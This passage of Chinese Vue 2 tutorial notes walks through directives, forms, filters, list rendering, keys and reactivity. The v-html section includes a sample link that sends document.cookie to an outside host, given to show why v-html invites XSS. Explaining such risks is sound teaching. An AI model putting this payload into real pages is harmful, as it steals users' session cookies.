	<title>条件渲染</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>当前的n值是:{{n}}</h2>
		<button @click="n++">点我n+1</button>
		<!-- 使用v-show做条件渲染  元素隐藏-->
		<!-- <h2 v-show="false">欢迎来到{{name}}</h2>
		<h2 v-show="true">欢迎来到{{name}}</h2> -->
		<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

		<!-- 使用v-if做条件渲染  元素直接被移除-->
		<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
		<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

		<!-- <h2 v-show="n === 1">你好</h2>
		<h2 v-show="n===2">百度</h2>
		<h2 v-show="n===3">北京</h2> -->

		<h2 v-if="n===1">你好</h2>
		<h2 v-if="n===1">百度</h2>
		<h2 v-if="n===3">北京</h2>

		<!-- v-else和v-else-if -->
		<div v-if="n === 1">Angular</div>
		<div v-else-if="n === 1">React</div> //这里react不显示
		<div v-else-if="n === 3">Vue</div>
		<div v-else>哈哈</div>

		<!-- v-if与template的配合使用,template不能与v-show一起使用 -->
		<!-- <template v-if="n === 1">
			<h2>你好</h2>
			<h2>百度</h2>
			<h2>北京</h2>
		</template> -->

	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false

	const vm = new Vue({
		el: '#root',
		data: {
			name: '百度',
			n: 0
		}
	})
</script>

</html>
 
```

## 2.13 收集表单数据 v-model详解

```js
收集表单数据：
	若：<input type="text"/>，则v-model默认收集的是value值，用户输入的就是value值。
	若：<input type="password"/>，则v-model默认收集的是value值，用户输入的就是value值。
	若：<input type="radio"/>，则v-model默认收集的是value值，因为此类型无法输入内容，则无法
        通过输入得到value值，所以要给标签手动添加value值。
	若：<input type="checkbox"/>
            1.没有配置input的value属性，那么默认读取的的就是checked是否被勾选（勾选 or 未勾选，是布尔值）
            2.配置input的value属性:
         	(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
	        (2)v-model的初始值是数组，那么收集的的就是value组成的数组
	备注：v-model的三个修饰符：
			lazy：失去焦点再收集数据
			number：输入字符串转为有效的数字
		        trim：输入首尾空格过滤
 
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account">
                                <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
                          //v-model默认收集的是value值，用户输入的就是value值。
				性别：
                         //  因为此类型无法输入内容，则无法通过输入得到value值，所以要给标签手动添加value值。
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> 
                                <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
                            //如果是select，则value与v-model绑定的city属性的初始值相同的为初始默认
                            值，如果city初始值为空，则默认为第一个。
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
                                        //v-model的初始值是数组，那么收集的的就是value组成的数组
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
 
```

## 2.14过滤器（filter）

```js
过滤器：
	定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
	语法：
		1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
		2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
	备注：
		1.过滤器也可以接收额外参数、多个过滤器也可以串联
		2.并没有改变原本的数据, 是产生新的对应的数据
		3.不是必须的属性，完全可以用methods和computed实现下面代码中的过滤功能
                4.当全局过滤器和局部过滤器重名时，会采用局部过滤器。
 
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<title>过滤器</title>
	<script type="text/javascript" src="../js/vue.js"></script>
	<!-- <script type="text/javascript" src="../js/dayjs.min.js"></script> -->
	<script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>

</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>显示格式化后的时间</h2>
		<!-- 计算属性实现 -->
		<h3>计算属性实现：{{fmtTime}}</h3>
		<!-- methods实现 -->
		<h3>methods实现：{{getFmtTime()}}</h3>
		<!-- 过滤器实现 -->
		<h3>过滤器实现：{{time | timeFormater}}</h3> //将time当参数传给timeFormater
		<!-- 过滤器实现（传参） -->
		<h3>过滤器实现（传参）：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
		<h3 :x="msg | mySlice">{{msg}}</h3>
	</div>

	<div id="root2">
		<h2>{{msg | mySlice}}</h2>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false
	//全局过滤器,必须在new Vue（{}）之前
	Vue.filter('mySlice', function (value) {
		return value.slice(0, 4)
	})

	new Vue({
		el: '#root',
		data: {
			time: 1621561377603, //时间戳
			msg: '你好，尚硅谷'
		},
		computed: {
			fmtTime() {
				return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
			}
		},
		methods: {
			getFmtTime() {
				return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
			}
		},
		// filters: {
		// 	timeFormater(value) {
		// 		return dayjs(value).format('YYYY年MM月DD日 HH:mm:ss')

		// 	}
		// }

		//局部过滤器
		filters: {
                //如果不传参数，则使用默认参数'YYYY年MM月DD日 HH:mm:ss'，如果传参数，则使用
                //传入的参数'YYYY_MM_DD'
			timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
				// console.log('@',value)
				return dayjs(value).format(str)
			}
		}
	})

	new Vue({
		el: '#root2',
		data: {
			msg: 'hello,atguigu!'
		}
	})
</script>
</html>
```

## 2.15列表渲染

**因为列表渲染渲染比较复杂，我把它拆成了一个个的小模块来逐步讲解，所有代码可运行**

### 1.建立一个基本列表

**了解v-for的基本使用**

```js
    v-for指令:
		1.用于展示列表数据
		2.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
                3.`v-for` 指令需要使用 `item in items` 形式的特殊语法，其中 `items` 是源数据
                数组，而 `item` 则是被迭代的数组元素的别名（形参）。
                4.`v-for` 还支持一个可选的第二个参数，即当前项的索引。
                5.语法：v-for="(item, index) in xxx" :key="yyy"
                6.你也可以用 `of` 替代 `in` 作为分隔符，因为它更接近 JavaScript 迭代器的语法：
		
 
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>基本列表</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<!-- 遍历数组 -->
		<h2>人员列表（遍历数组）</h2>
		<ul>
			<li v-for="(p,index) of persons" :key="p.id">
				<!-- {{p}} -->
				{{p.name}}-{{p.age}}--{{p.id}}
			</li>
		</ul>

		<!-- 遍历对象 -->
		<h2>汽车信息（遍历对象）</h2>
		<ul>
			<li v-for="(value,name) of car" :key="name">
				{{name}}-{{value}}
			</li>
		</ul>

		<!-- 遍历字符串 -->
		<h2>测试遍历字符串（用得少）</h2>
		<ul>
			<li v-for="(char,index) of str" :key="index">
				{{char}}-{{index}}
			</li>
		</ul>

		<!-- 遍历指定次数 -->
		<h2>测试遍历指定次数（用得少）</h2>
		<ul>
			<li v-for="(number,index) of 5" :key="index">
				{{index}}-{{number}}
			</li>
		</ul>
	</div>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el: '#root',
			data: {
				persons: [
					{ id: '001', name: '张三', age: 18 },
					{ id: '002', name: '李四', age: 19 },
					{ id: '003', name: '王五', age: 20 }
				],
				car: {
					name: '奥迪A8',
					price: '70万',
					color: '黑色'
				},
				str: 'hello'
			}
		})
	</script>
</html>
 
```

### 2.key的原理

有相同父元素的子元素必须有**独特的 key**。重复的 key 会造成渲染错误。

**面试题：react、vue中的key有什么作用？（key的内部原理）**

```js
	1. 虚拟DOM中key的作用：
		key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】,
                随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
										
	2.对比规则：
		(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
		     ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
		     ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

		(2).旧虚拟DOM中未找到与新虚拟DOM相同的key创建新的真实DOM，随后渲染到到页面。

	3. 用index作为key可能会引发的问题：
		1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
	                会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

		2. 如果结构中还包含输入类的DOM：
			会产生错误DOM更新 ==> 界面有问题。

	4. 开发中如何选择key?:
		1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
		2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
		使用index作为key是没有问题的。
		3.如果不写key，则默认为index
		
 
```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4c9e8cc4eaa74853b9cafb3439a103bb~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b93522c097d4790b27b45b0cd459033~tplv-k3u1fbpfcp-watermark.awebp)

```js
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<title>key的原理</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	
	<!-- 准备好一个容器-->
	<div id="root">
		<!-- 遍历数组  :key="index"-->
		<h2>人员列表（遍历数组）:key="index"</h2>
		<button @click.once="add">添加一个老刘</button>
		<ul>
			<li v-for="(p,index) of persons" :key="index">
				{{p.name}}-{{p.age}}
				<input type="text">
			</li>
		</ul>
		<!-- 遍历数组 -->
		<h2>人员列表（遍历数组）:key="p.id"</h2>
		<button @click.once="add">添加一个老刘</button>
		<ul>
			<li v-for="(p,index) of persons" :key="p.id">
				{{p.name}}-{{p.age}}
				<input type="text">
			</li>
		</ul>
	</div>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el: '#root',
			data: {
				persons: [
					{ id: '001', name: '张三', age: 18 },
					{ id: '002', name: '李四', age: 19 },
					{ id: '003', name: '王五', age: 20 }
				]
			},
			methods: {
				add() {
					const p = { id: '004', name: '老刘', age: 40 }
					this.persons.unshift(p)
                                        //将p插入到persons的开头
				}
			},
		})
	</script>

</html>
 
```

**初始输入：**
 ![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/67f70ce3077a447889c4820bc6926497~tplv-k3u1fbpfcp-watermark.awebp)

**点击添加一个老刘:**
 ![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/379315f9a2f04476a3325a45f7826082~tplv-k3u1fbpfcp-watermark.awebp)

### 3.列表过滤

**用computed实现（推荐）**

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>列表过滤</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 1.收集用户输入
	     2.拿用户输入的东西进行数据匹配
	-->
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>人员列表</h2>
		<input type="text" placeholder="请输入名字" v-model="keyWord">
		<ul>
			<li v-for="(p,index) of filPerons" :key="index">
				{{p.name}}-{{p.age}}-{{p.sex}}
			</li>
		</ul>
	</div>

	<script type="text/javascript">
		Vue.config.productionTip = false
		// 用computed实现
		new Vue({
			el: '#root',
			data: {
				keyWord: '',
				persons: [
					{ id: '001', name: '马冬梅', age: 19, sex: '女' },
					{ id: '002', name: '周冬雨', age: 20, sex: '女' },
					{ id: '003', name: '周杰伦', age: 21, sex: '男' },
					{ id: '004', name: '温兆伦', age: 22, sex: '男' }
				]
			},
			computed: {
				filPerons() {
					return this.persons.filter((p) => {
						return p.name.indexOf(this.keyWord) !== -1
					})
				}
			}
		})
	</script>

</html>
 
```

**用watch实现**

```js
		// #region 开始折叠
                //将下面代码放入上方代码块中
		new Vue({
			el: '#root',
			data: {
				keyWord: '',
				persons: [
					{ id: '001', name: '马冬梅', age: 19, sex: '女' },
					{ id: '002', name: '周冬雨', age: 20, sex: '女' },
					{ id: '003', name: '周杰伦', age: 21, sex: '男' },
					{ id: '004', name: '温兆伦', age: 22, sex: '男' }
				],
				filPerons: []
			},
			watch: {
				keyWord: {
					immediate: true,
					// 初始化的时候让handler调用一下,因为开始filPerons: []为空数组,
					// 页面上什么内容都不显示,而恰巧handler(val)获取的值为空,
					// 而所有字符串第0位不仅包含自己第一个字符,也包含着一个空字符,p.name.indexOf('')为0 
					// 所以handler(val)函数判断成功,页面显示内容
					handler(val) {
						this.filPerons = this.persons.filter((p) => {
							return p.name.indexOf(val) !== -1
							// 判断p.name中是否包含有val值，如果不等于-1，则说明包含
							// filter返回一个全新的数组，原数组不变
						})
					}
				}
			}
		})
 
```

**初始值：**
 ![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cbbca5c60390484a965f324a2f8ee497~tplv-k3u1fbpfcp-watermark.awebp)

**过滤后：**
 ![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d6b8da31f1e04d5b8f4e1f288f0668f5~tplv-k3u1fbpfcp-watermark.awebp)

### 4.列表排序

**列表排序与列表过滤一般是连在一起使用的**

```js
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<title>列表排序</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>人员列表</h2>
		<input type="text" placeholder="请输入名字" v-model="keyWord">
		<button @click="sortType = 2">年龄升序</button>
		<button @click="sortType = 1">年龄降序</button>
		<button @click="sortType = 0">原顺序</button>
		<ul>
			<li v-for="(p,index) of filPerons" :key="p.id">
				{{p.name}}-{{p.age}}-{{p.sex}}
				<input type="text">
			</li>
		</ul>
	</div>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el: '#root',
			data: {
				keyWord: '',
				sortType: 0, //0原顺序 1降序 2升序
				persons: [
					{ id: '001', name: '马冬梅', age: 30, sex: '女' },
					{ id: '002', name: '周冬雨', age: 31, sex: '女' },
					{ id: '003', name: '周杰伦', age: 18, sex: '男' },
					{ id: '004', name: '温兆伦', age: 19, sex: '男' }
				]
			},
			computed: {
				filPerons() {
					const arr = this.persons.filter((p) => {
						return p.name.indexOf(this.keyWord) !== -1
					})
					//判断一下是否需要排序
					if (this.sortType !== 0) {
						arr.sort((p1, p2) => {
							return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
						})
					}
					return arr
				}
			}
		})

	</script>

</html>
 
```

### 5.数据监测（ Vue.set）

#### Vue.set()的使用

**Vue.set(添加目标,'添加属性','属性值')**

- Vue.set(this.student,'sex','男')

//添加目标可以用this.student，也可以用vm.student（_data因为数据代理可省略）

- this.$set(this.student, 'sex', '男')

**原理**：
 向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `this.myObject.newProperty = 'hi'`（vm.上面的对象.添加的新属性 = '属性值'）)

**注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。**

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5bbacf233a3449d7a8a13fff0e9c1fc2~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8770364fbe47426b88d7790655cd5802~tplv-k3u1fbpfcp-watermark.awebp)

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>Vue监测数据改变的原理</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h1>学校信息</h1>
		<h2>学校名称：{{school.name}}</h2>
		<h2>学校地址：{{school.address}}</h2>
		<h2 v-if="school.leader">校长是：{{school.leader}}</h2>
		<button @click='addRen'>添加校长</button>
		<hr />
		<h1>学生信息</h1>
		<button @click="addSex">添加一个性别属性，默认值是男</button>
		<h2>姓名：{{student.name}}</h2>
		<h2 v-if="student.sex">性别：{{student.sex}}</h2>
		<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
		<h2>朋友们</h2>
		<ul>
			<li v-for="(f,index) in student.friends" :key="index">
				{{f.name}}--{{f.age}}
			</li>
		</ul>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			school: {
				name: '尚硅谷',
				address: '北京',
			},
			student: {
				name: 'tom',
				age: {
					rAge: 40,
					sAge: 29,
				},
				friends: [
					{ name: 'jerry', age: 35 },
					{ name: 'tony', age: 36 }
				]
			}
		},
		methods: {
			addSex() {
				// Vue.set(this.student,'sex','男')
				// Vue.set(添加目标,'添加属性','属性值')
				this.$set(this.student, 'sex', '男')
			},
			addRen() {
				// Vue.set(添加目标,'添加属性','属性值')
				this.$set(this.school, 'leader', '一个教授')
			}
		}
	})
</script>
</html>
 
```

#### Vue检测对象/数组中的元素改变

```js
Vue监视数据的原理：
	1. vue会监视data中所有层次的数据。
        2. 如何监测对象中的数据？
		通过setter实现监视，且要在new Vue时就传入要监测的数据。
			(1).对象中后追加的属性，Vue默认不做响应式处理，即改变其值页面无变化
			(2).如需给后添加的属性做响应式，请使用如下API：
			      Vue.set(target，propertyName/index，value) 或 
			      vm.$set(target，propertyName/index，value)
                              //vm.$set(添加目标,'添加属性/索引值','属性值')
        3. 如何监测数组中的数据？
		通过包裹数组更新元素的方法实现，本质就是做了两件事：
			(1).调用原生对应的方法对数组进行更新。
			(2).重新解析模板，进而更新页面。
        4.在Vue修改数组中的某个元素一定要用如下方法：
		1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
		2.Vue.set() 或 vm.$set()
		3.如果不使用上面方法而是直接对数组赋值则vue无法响应，例如：
                this.student.hobby[0] = "开车"，数据已被更改，但页面中无任何反应
	特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象(vm._data) 添加属性！！！
 
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<title>总结数据监视</title>
	<style>
		button {
			margin-top: 10px;
		}
	</style>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h1>学生信息</h1>
		<button @click="student.age++">年龄+1岁</button> <br />
		<button @click="addSex">添加性别属性，默认值：男</button> <br />
		<button @click="student.sex = '未知' ">修改性别</button> <br />
		<button @click="addFriend">在列表首位添加一个朋友</button> <br />
		<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
		<button @click="addHobby">添加一个爱好</button> <br />
		<button @click="updateHobby">修改第一个爱好为：开车</button> <br />
		<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
		<h3>姓名：{{student.name}}</h3>
		<h3>年龄：{{student.age}}</h3>
		<h3 v-if="student.sex">性别：{{student.sex}}</h3>
		<h3>爱好：</h3>
		<ul>
			<li v-for="(h,index) in student.hobby" :key="index">
				{{h}}
			</li>
		</ul>
		<h3>朋友们：</h3>
		<ul>
			<li v-for="(f,index) in student.friends" :key="index">
				{{f.name}}--{{f.age}}
			</li>
		</ul>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			student: {
				name: 'tom',
				age: 18,
				hobby: ['抽烟', '喝酒', '烫头'],
				friends: [
					{ name: 'jerry', age: 35 },
					{ name: 'tony', age: 36 }
				]
			}
		},
		methods: {
			addSex() {
				// Vue.set(this.student,'sex','男')
				// this.$set(this.student,'sex','男')
				Vue.set(vm._data.student, 'sex', '男')
                               // 往student对象再追加属性
			},
			addFriend() {
				this.student.friends.unshift({ name: 'jack', age: 70 })
			},
			updateFirstFriendName() {
                             // 直接this.student.friends[0] = 'xx' 是错的，数组不能直接修改
				this.student.friends[0].name = '张三'
			},
			addHobby() {
				this.student.hobby.push('学习')
			},
			updateHobby() {
				// this.student.hobby.splice(0,1,'开车')  用数组属性修改元素
				// Vue.set(this.student.hobby,0,'开车') 直接使用Vue.set修改
				this.$set(this.student.hobby, 0, '开车')
			},
			removeSmoke() {
				// filter()、concat() 和 slice()。它们不会变更原始数组，而总是返回一个新数组。当使用非变更方法时，可以用新数组替换旧数组：
				this.student.hobby = this.student.hobby.filter((hobby) => {
					// 所有不是由vue控制的回调，尽可能写成箭头函数
					return hobby !== '抽烟'
				})
			}
		}
	})
</script>

</html>
```

## 2.16内置指令

### v-text指令

```js
	我们学过的指令：
		v-bind	: 单向绑定解析表达式, 可简写为 :xxx
		v-model	: 双向数据绑定
		v-for  	: 遍历数组/对象/字符串
		v-on   	: 绑定事件监听, 可简写为@
		v-if 	: 条件渲染（动态控制节点是否存存在）
		v-else 	: 条件渲染（动态控制节点是否存存在）
		v-show 	: 条件渲染 (动态控制节点是否展示)
		v-text指令：
			1.作用：向其所在的节点中渲染文本内容，放入标签则也会被当成文本解析
			2.与插值语法的区别：v-text会替换掉节点中的内容，你原来的内容会被代替，
                        无法与原来的内容一起出现，{{xx}}则可以。
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>v-text指令</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<div>你好，{{name}}</div>        //  你好，尚硅谷
		<div v-text="name">你好，</div> //   尚硅谷
		<div v-text="str"></div>       //   <h3>你好啊</h3>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷',
			str: '<h3>你好啊！</h3>'
		}
	})
</script>
</html>
 
```

### v-html指令

**前置知识：cookie：**

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1c58435a19034fc3a9ff93a6af62c3e2~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5bc6e87e58794322b80666e918bae7d7~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6046f68374d9492184248cf53ab6c9c2~tplv-k3u1fbpfcp-watermark.awebp)

```js
	v-html指令：
		1.作用：向指定节点中渲染包含html结构的内容。 更新元素的 innerHTML。注意：内容
                按普通 HTML 插入 , 不会作为 Vue 模板进行编译。如果试图使用 v-html 组合模板，可
                以重新考虑是否通过使用组件来替代。
		2.与插值语法的区别：
			(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
			(2).v-html可以识别html结构，与v-text不同。
		3.严重注意：v-html有安全性问题！！！！
			(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
			(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
 
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>v-html指令</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<div>你好，{{name}}</div>
		<div v-html="str"></div>
		<div v-html="str2"></div>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷',
			str: '<h3>你好啊！</h3>',
			str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
		}
	})
</script>
</html>
 
```

### v-cloak指令

```js
	v-cloak指令（没有值）：
		1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
		2.使用css配合v-cloak可以解决网速慢时页面展示出模板{{xxx}}的问题。
 
```

script引入的是我自制的server，作用是5s后script标签加载成功，注意script标签的的引入位置，是先执行html模板，5s后渲染页面{{name}}变为尚硅谷，想让{{name}}在5s内隐藏，不显示在页面中，script标签加载成功后直接出现尚硅谷，用v-cloak。

```js
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<title>v-cloak指令</title>
	<style>
		[v-cloak] {
			display: none;
		}
	</style>
	<!-- 引入Vue -->
</head>

<body>
	<div id="root">
		<h2 v-cloak>{{name}}</h2>
	</div>
	<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
</body>

<script type="text/javascript">
	console.log(1)
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷'
		}
	})
</script>
</html>
 
```

### v-once指令

```js
	v-once指令：
		1.v-once所在节点在初次动态渲染后，就视为静态内容了。
		2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
 
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
 
```

### v-pre指令

**用于vue性能优化**

```js
         v-pre指令：
		1.跳过其所在节点的编译过程。
		2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
 
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
 
```

## 2.17自定义指令

```js
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
	自定义指令总结：
		一、定义语法：
		(1).局部指令：
	 new Vue({					 new Vue({
		directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
	}) 				                 })
		(2).全局指令：
		Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
                
                二、配置对象中常用的3个回调：
			(1).bind：指令与元素成功绑定时调用。
			(2).inserted：指令所在元素被插入页面时调用。
			(3).update：指令所在模板结构被重新解析时调用。

		三、备注：
			1.指令定义时不加v-，但使用时要加v-；
			2.指令名如果是多个单词，要使用kebab-case命名方式，别忘了加"",不要用camelCase命名。
			3.所有指令相关的this都是window
 
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>自定义指令</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>{{name}}</h2>
		<h2>当前的n值是：<span v-text="n"></span> </h2>
		<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
		<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
		<button @click="n++">点我n+1</button>
		<hr />
		<input type="text" v-fbind:value="n">
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false

	//定义全局指令
	/* Vue.directive('fbind',{
		//指令与元素成功绑定时（一上来）
		bind(element,binding){
			element.value = binding.value
		},
		//指令所在元素被插入页面时
		inserted(element,binding){
			element.focus()
		},
		//指令所在的模板被重新解析时
		update(element,binding){
			element.value = binding.value
		}
	})
	Vue.directive('big',function(element, binding) { //两个参数：当前DOM元素（span），本次绑定的所有信息
				console.log(element, binding)
				// console.log('big', this) 
				//注意此处的this是window
				element.innerText = binding.value * 10
			},)
 */
	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷',
			n: 1
		},
		directives: {

			//指令名如果是多个单词，别忘了加"",方法内部放的是"key"，value值，大部分情况""可省略，但加了-之后引号必须带。
			// 全写是： 'big-number':function(element,binding){} 
			/* 'big-number'(element,binding){
				// console.log('big')
				element.innerText = binding.value * 10
			}, */

			// big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
			big(element, binding) { //两个参数：当前DOM元素（span），本次绑定的所有信息
